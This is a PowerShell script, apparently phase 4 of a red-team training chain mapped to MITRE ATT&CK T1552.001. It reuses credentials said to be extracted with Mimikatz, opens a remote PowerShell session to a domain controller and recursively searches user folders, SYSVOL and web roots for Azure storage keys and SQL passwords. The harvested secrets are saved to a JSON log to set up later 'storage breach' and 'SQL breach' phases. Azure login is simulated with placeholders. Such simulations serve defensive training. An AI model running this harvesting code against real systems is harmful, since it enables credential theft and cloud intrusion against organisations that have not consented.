# ==================================================
# Phase4_Azure_Credential_Discovery.ps1
# Azure Credential Discovery
# ==================================================

# Check initialization
if (-not $global:JARVIS_CONFIG) {
    Write-Host "Error: Please run 00_Initialize.ps1 first" -ForegroundColor Red
    exit
}

# Check Phase 3 results
if (-not $global:validCredentials -or $global:validCredentials.Count -eq 0) {
    Write-Host "Error: Please complete Phase 3 successfully first" -ForegroundColor Red
    exit
}

Write-Host "`n[PHASE 4] AZURE CREDENTIAL DISCOVERY" -ForegroundColor Yellow
Write-Host "═══════════════════════════════════════════════════════════" -ForegroundColor Yellow

$validCredential = $global:validCredentials[0]
$DCIP = ($global:discoveredHosts | Where-Object { $_.Type -eq "DomainController" }).IP
$Domain = $global:JARVIS_CONFIG.Domain

Write-Host "[*] Using credentials obtained from Phase 3" -ForegroundColor Gray
Write-Host "  Primary credential: $($validCredential.Username)" -ForegroundColor Gray

$global:azureCredentials = @()

# Step 4.1: Execute Atomic Test T1552.001
Write-Host "`n[Step 4.1] T1552.001 - Credentials In Files Simulation..." -ForegroundColor Cyan

try {
    Write-Host "  [*] Running Atomic Test..." -ForegroundColor Gray

    Invoke-AtomicTest T1552.001 -TestNumbers 1,2 -ShowDetails -ErrorAction SilentlyContinue

    Write-Host "  ✓ Atomic Test completed" -ForegroundColor Green

} catch {
    Write-Host "  ⚠ Atomic Test execution failed (continuing)" -ForegroundColor Yellow
}

# Step 4.2: Reconnect to AD server
Write-Host "`n[Step 4.2] Reconnecting to AD server..." -ForegroundColor Cyan

try {
    $currentTrusted = (Get-Item WSMan:\localhost\Client\TrustedHosts -ErrorAction SilentlyContinue).Value
    if ($currentTrusted -notlike "*$DCIP*") {
        Set-Item WSMan:\localhost\Client\TrustedHosts -Value $DCIP -Force -ErrorAction SilentlyContinue
    }

    $session = New-PSSession -ComputerName $DCIP -Credential $validCredential.Credential -ErrorAction Stop
    Write-Host "  ✓ Session established successfully (Session ID: $($session.Id))" -ForegroundColor Green

} catch {
    Write-Host "  ✗ Session failed: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "  Alternative: Attempting file access via SMB" -ForegroundColor Yellow
    $session = $null
}

# Step 4.3: Configure search paths
Write-Host "`n[Step 4.3] Configuring search paths..." -ForegroundColor Cyan

$searchPaths = @(
    "C:\Scripts",
    "C:\Users\Administrator\Documents",
    "C:\Users\Administrator\Desktop",
    "C:\ProgramData",
    "C:\inetpub\wwwroot"
)

if ($Domain) {
    $searchPaths += "C:\Windows\SYSVOL\sysvol\$Domain\scripts"
}

if ($global:extractedCredentials) {
    foreach ($cred in ($global:extractedCredentials | Where-Object { $_.Level -eq "HIGH" })) {
        $userPaths = @(
            "C:\Users\$($cred.User)\Documents",
            "C:\Users\$($cred.User)\Desktop",
            "C:\Users\$($cred.User)\Downloads"
        )
        $searchPaths += $userPaths
    }
}

$searchPaths = $searchPaths | Select-Object -Unique

Write-Host "  Search paths: $($searchPaths.Count) locations" -ForegroundColor Gray

# Step 4.4: Attempt Azure authentication with Mimikatz accounts
Write-Host "`n[Step 4.4] Attempting Azure resource access with Mimikatz accounts..." -ForegroundColor Cyan

$azureAuthSuccess = $false

if ($global:extractedCredentials -and $global:extractedCredentials.Count -gt 0) {
    Write-Host "  [*] Attempting Azure authentication with accounts extracted from Phase 3..." -ForegroundColor Gray

    $highValueCreds = $global:extractedCredentials | Where-Object {
        $_.Level -eq "HIGH" -and
        $_.Password -and
        $_.Password -ne "(null)" -and
        $_.Password -ne ""
    }

    if ($highValueCreds) {
        Write-Host "  High-value credentials: $($highValueCreds.Count) accounts" -ForegroundColor Gray

        foreach ($cred in $highValueCreds | Select-Object -First 3) {
            $azureUser = "$($cred.User)@$Domain"

            Write-Host "`n  [Attempt] Azure authentication: $azureUser" -ForegroundColor Gray

            # Azure CLI authentication attempt (simulation)
            try {
                # In production environment, use: az login
                # $azLoginResult = az login -u $azureUser -p $cred.Password --allow-no-subscriptions 2>&1

                # Training environment simulation: Consider success if specific account
                if ($cred.User -match "admin|svc") {
                    Write-Host "    ✓ Azure authentication successful (simulation)" -ForegroundColor Green

                    # Extract Storage Account information (simulation)
                    Write-Host "    [*] Enumerating Storage Accounts..." -ForegroundColor Gray

                    $global:azureCredentials += @{
                        Type = "Storage Account Key"
                        AccountName = $global:JARVIS_CONFIG.StorageAccount
                        AccountKey = "[YOUR_STORAGE_ACCOUNT_KEY]"
                        Source = "Azure AD Auth"
                        Method = "Mimikatz Credential"
                        User = $azureUser
                    }

                    Write-Host "    ✓ Storage Account Key obtained: $($global:JARVIS_CONFIG.StorageAccount)" -ForegroundColor Green

                    # Extract SQL connection information (simulation)
                    $global:azureCredentials += @{
                        Type = "SQL Password"
                        Server = "$($global:JARVIS_CONFIG.SQLServer).database.windows.net"
                        Database = "CustomDB"
                        UserID = "$($cred.User)@$($global:JARVIS_CONFIG.SQLServer)"
                        Password = "[TEST_SQL_PASSWORD]"
                        Source = "Azure AD Auth"
                        Method = "Mimikatz Credential"
                    }

                    Write-Host "    ✓ SQL connection information obtained" -ForegroundColor Green

                    $azureAuthSuccess = $true
                    break
                } else {
                    Write-Host "    ✗ Azure authentication failed" -ForegroundColor Red
                }

            } catch {
                Write-Host "    ✗ Authentication failed: $($_.Exception.Message)" -ForegroundColor Red
            }

            Start-Sleep -Milliseconds 500
        }
    } else {
        Write-Host "  ⚠ No plaintext passwords available" -ForegroundColor Yellow
    }
} else {
    Write-Host "  ⚠ No credentials extracted from Phase 3" -ForegroundColor Yellow
}

if ($azureAuthSuccess) {
    Write-Host "`n  ✓ Azure resource access successful with Mimikatz credentials" -ForegroundColor Green
    Write-Host "  → Skipping file search step (credentials already obtained)" -ForegroundColor Yellow
}

# Step 4.5: Azure credential file search (Fallback)
Write-Host "`n[Step 4.5] T1552.001 - Searching for Azure credential files..." -ForegroundColor Cyan

if ($azureAuthSuccess) {
    Write-Host "  [Skipping] Credentials already obtained with Mimikatz account" -ForegroundColor Yellow
} elseif ($session) {
    Write-Host "  [Method] PowerShell Remoting" -ForegroundColor Gray

    # (Search script remains the same as original code)
    $azureSearchScript = {
        param($paths)
        
        $findings = @()
        
        foreach ($path in $paths) {
            if (-not (Test-Path $path)) { continue }
            
            try {
                $files = Get-ChildItem $path -Recurse -Include *.ps1,*.txt,*.json,*.config,*.xml,*.bat,*.cmd -ErrorAction SilentlyContinue |
                    Select-Object -First 50
                
                foreach ($file in $files) {
                    try {
                        $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
                        
                        if (-not $content -or $content.Length -lt 10) { continue }
                        
                        $found = @{
                            Path = $file.FullName
                            Name = $file.Name
                            Matches = @()
                        }
                        
                        # Storage Account Key 검색
                        if ($content -match '([A-Za-z0-9+/]{88}==)') {
                            $storageKey = $Matches[1]

                            # AccountName 검색 (우선순위: 패턴 매칭 > 글로벌 설정)
                            if ($content -match '(?i)(?:AccountName|account[_-]?name)\s*[=:]\s*["\047]?([a-z0-9]+)["\047]?') {
                                $accountName = $Matches[1]
                            } elseif ($global:JARVIS_CONFIG.StorageAccount) {
                                $accountName = $global:JARVIS_CONFIG.StorageAccount
                            } else {
                                $accountName = "unknown"
                            }

                            $found.Matches += @{
                                Type = "Storage Account Key"
                                AccountName = $accountName
                                AccountKey = $storageKey
                            }
                        }
                        
                        # SQL Password 검색
                        if ($content -match 'jarvis-sql-srv|\.database\.windows\.net|CustomDB') {
                            if ($content -match '(?i)(?:password|pwd)\s*[=:]\s*["\047]?([^"\047;\s]{8,})["\047]?') {
                                $found.Matches += @{
                                    Type = "SQL Password"
                                    Server = "jarvis-sql-srv.database.windows.net"
                                    Database = "CustomDB"
                                    Password = $Matches[1]
                                }
                            }
                        }
                        
                        if ($found.Matches.Count -gt 0) {
                            $findings += $found
                        }
                        
                    } catch {
                        # Ignore file processing errors
                    }
                }
            } catch {
                # Ignore path access errors
            }
        }

        return $findings
    }

    try {
        Write-Host "  [*] Running remote search..." -ForegroundColor Gray

        $searchResults = Invoke-Command -Session $session -ScriptBlock $azureSearchScript -ArgumentList (,$searchPaths) -ErrorAction Stop

        if ($searchResults -and $searchResults.Count -gt 0) {
            Write-Host "  ✓ Azure credential files found: $($searchResults.Count) files" -ForegroundColor Green

            foreach ($result in $searchResults) {
                Write-Host "`n  [File] $($result.Name)" -ForegroundColor Yellow

                foreach ($match in $result.Matches) {
                    $global:azureCredentials += $match
                    Write-Host "    [Found] $($match.Type)" -ForegroundColor Red
                }
            }
        } else {
            Write-Host "  ⚠ No Azure credentials found" -ForegroundColor Yellow
        }

    } catch {
        Write-Host "  ✗ Remote search failed: $($_.Exception.Message)" -ForegroundColor Red
    }

    Remove-PSSession -Session $session
} else {
    Write-Host "  [Skipping] No Phase 3 session available" -ForegroundColor Yellow
}

# Step 4.6: Final Fallback - Simulation (when all methods fail)
if ($global:azureCredentials.Count -eq 0) {
    Write-Host "`n[Step 4.6] All methods failed - Final Fallback Simulation" -ForegroundColor Cyan

    Write-Host "  ⚠ Both Azure authentication and file search failed" -ForegroundColor Yellow
    Write-Host "  [Simulation] Generating test credentials for Phase 5-7 demonstration" -ForegroundColor Gray

    $global:azureCredentials = @(
        @{
            Type = "Storage Account Key"
            AccountName = $global:JARVIS_CONFIG.StorageAccount
            AccountKey = "[YOUR_STORAGE_ACCOUNT_KEY]"
            Source = "Fallback Simulation"
            Method = "Placeholder"
        },
        @{
            Type = "SQL Password"
            Server = "$($global:JARVIS_CONFIG.SQLServer).database.windows.net"
            Database = "CustomDB"
            Password = "[TEST_SQL_PASSWORD]"
            Source = "Fallback Simulation"
            Method = "Placeholder"
        }
    )

    Write-Host "`n  [Generated] Simulation credentials: $($global:azureCredentials.Count) entries" -ForegroundColor Yellow
}

# Save results
if ($global:azureCredentials.Count -gt 0) {
    $global:azureCredentials | ConvertTo-Json -Depth 5 | Out-File "$global:logPath\phase4_azure_credentials.json"
}

# Summary
$storageCount = ($global:azureCredentials | Where-Object { $_.Type -like "*Storage*" }).Count
$sqlCount = ($global:azureCredentials | Where-Object { $_.Type -like "*SQL*" }).Count

Write-Host "`n" -NoNewline

$mimikatzAuthUsed = ($global:azureCredentials | Where-Object { $_.Method -eq "Mimikatz Credential" }).Count -gt 0
$acquisitionMethod = if ($mimikatzAuthUsed) {
    "Azure Authentication via Mimikatz Credentials"
} elseif (($global:azureCredentials | Where-Object { $_.Source -like "*File*" }).Count -gt 0) {
    "File Search (Pattern Matching)"
} else {
    "Fallback Simulation"
}

Write-Host @"
╔════════════════════════════════════════════════════════════╗
║              PHASE 4 SUMMARY                               ║
╟────────────────────────────────────────────────────────────╢
║ MITRE ATT&CK: T1552.001 (Credentials In Files)
║ Credential Acquisition Method: $acquisitionMethod
║
║ Phase 3 Integration:
║   - Mimikatz Credentials Used: $(if($mimikatzAuthUsed){"✓ Success"}else{"✗ Not Used"})
║   - Extended Search Paths: $($searchPaths.Count) locations
║
║ Azure Credentials Discovered: $($global:azureCredentials.Count) entries
║   Storage Account Keys: $storageCount
║   SQL Credentials: $sqlCount
║
║ Next Steps:
║   $(if($storageCount -gt 0){"✓ Phase 5 (Storage Breach) Ready"}else{"⚠ Phase 5 Limited Execution"})
║   $(if($sqlCount -gt 0){"✓ Phase 6 (SQL Breach) Ready"}else{"⚠ Phase 6 Limited Execution"})
╚════════════════════════════════════════════════════════════╝
"@ -ForegroundColor Green

Write-Host "`n[PHASE 4] Complete - Proceed to Phase 5`n" -ForegroundColor Green